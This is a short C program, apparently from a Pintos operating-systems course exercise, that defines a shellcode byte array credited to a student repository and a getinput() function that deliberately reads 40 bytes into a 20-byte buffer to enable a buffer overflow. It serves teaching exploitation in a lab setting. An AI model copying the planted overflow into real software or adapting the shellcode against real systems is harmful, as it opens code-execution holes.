
#include <syscall.h>
#include <stdlib.h>
#include <stdio.h>



/*
Shellcode based on John Litborn(2022) 
References
----------------
johli603[2022], https://gitlab.liu.se/johli603/pintos/-/blob/master_origin/src/examples/shellcode.c [Accessed: 21/11/2022]
Used shellcode as a payload for buffer overflow
*/
char shellcode[] =
  "\x90\x90\x90\x90\x90\xe9\x0b\x00"
  "\x00\x00\x6a\x02\xcd\x30\x31\xc0"
  "\x50\x40\x50\xcd\x30\xe8\xf0\xff"
  "\xff\xff""crack";
/*
*/

void 
getinput()
{
    char buf[20];
    read(0, buf, 40);
}

int
main (void)
{
    printf("The shellcode address:%x\n", shellcode);
    //printf("Please enter your input:");
    getinput();
    return 0;
}
